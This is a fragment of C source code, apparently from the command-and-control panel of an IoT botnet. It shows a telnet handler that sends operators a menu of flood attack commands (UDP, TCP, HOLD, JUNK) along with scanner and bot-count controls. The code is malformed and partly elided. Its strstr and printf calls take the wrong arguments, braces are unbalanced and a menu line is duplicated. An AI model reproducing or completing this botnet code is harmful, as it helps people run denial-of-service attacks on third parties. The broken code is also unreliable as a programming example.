...
void *telnetWorker(void *sock, void *telnetListener)
{
        ...
        if(send(thefd, "\x1b[32m \x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
		...
		{
		if(strstr(buf, "!* BOTS","BOTS","bots","!* bots")) 
		{  
		...
		if(strstr(buf, "!* HELP","!* help","HELP","help")
		{
			printf(botnet, "[~]					  AVALIABLE COMMANDS				    [~]\r\n");
			printf(botnet, "\r\n");
			printf(botnet, "	  	[+]					ATTACK METHODS					[+]\r\n");
			printf(botnet, "			!* UDP IP PORT SECS 32 0 10 --  UDP ATTACK METHOD\r\n");
			printf(botnet, "			!* TCP IP PORT SECS 32 0 10 --  TCP ATTACK METHOD\r\n");
			printf(botnet, "			!* HOLD IP PORT SECS		--  HOLD ATTACK\r\n");
			printf(botnet, "			!* JUNK IP PORT TIME		--  JUNK ATTACK\r\n");
			printf(botnet, "\r\n");
			printf(botnet, "		[+] 				OTHER COMMANDS				 	[+]\r\n");
			printf(botnet, "			!* KILLATTK				   --  ENDS ATTACK\r\n");
			printf(botnet, "			!* SCANNER ON			   --  STARTS SCANNER\r\n");
			printf(botnet, "			!* SCANNER OFF			   --  STOPS SCANNER\r\n");
			printf(botnet, "			!* PING					   --  PINGS AN IP\r\n");
			printf(botnet, "			!* GETLOCALIP			   --  GETS SERVER IP\r\n");
			printf(botnet, "			!* LOLNOGTFO			   --  CLEARS DUPLICATES\r\n");
			printf(botnet, "			!* STATUS				   --  DEVICE COUNT\r\n");
			printf(botnet, "			!* BOTS					   --  BOT COUNT\r\n");
			printf(botnet, "			!* BOTS					   --  BOT COUNT\r\n");
		}
                trim(buf);
                if(send(thefd, "\x1b[31m> \x1b[0m", 15, MSG_NOSIGNAL) == -1) goto end;
